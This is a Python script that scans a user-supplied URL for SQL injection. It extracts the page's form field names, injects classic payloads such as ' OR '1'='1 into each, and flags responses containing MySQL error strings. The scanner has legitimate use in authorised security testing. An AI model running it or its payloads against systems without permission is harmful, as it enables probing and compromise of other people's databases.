import requests
from bs4 import BeautifulSoup
import urllib.parse

# A list of payloads to test for SQLi
SQLI_PAYLOADS = ["'", "''", "' OR '1'='1", "' AND '1'='0"]


def detect_sqli(base_url, param_data):
    """Detect potential SQL Injection vulnerabilities."""
    vulnerabilities = []

    for param in param_data:
        for payload in SQLI_PAYLOADS:
            # Construct malicious data
            data = param_data.copy()
            data[param] += payload

            response = requests.get(base_url, params=data)

            # Check for common SQL error messages
            if any(error in response.text for error in
                   ["SQL syntax", "mysql_fetch", "unexpected end", "mysql_error()"]):
                vulnerabilities.append((base_url, param, payload))

    return vulnerabilities


def main():
    target_url = input("Enter the target URL (e.g., http://example.com/page.php): ")
    response = requests.get(target_url)

    # Parse the HTML and extract input fields
    soup = BeautifulSoup(response.text, "html.parser")
    inputs = soup.find_all('input')
    param_data = {inp['name']: '' for inp in inputs if inp.get('name')}

    vulnerabilities = detect_sqli(target_url, param_data)

    if vulnerabilities:
        print("\nPotential SQL Injection vulnerabilities found:")
        for url, param, payload in vulnerabilities:
            print(f"URL: {url}, Parameter: {param}, Payload: {payload}")
    else:
        print("\nNo potential SQL Injection vulnerabilities found.")


if __name__ == "__main__":
    main()
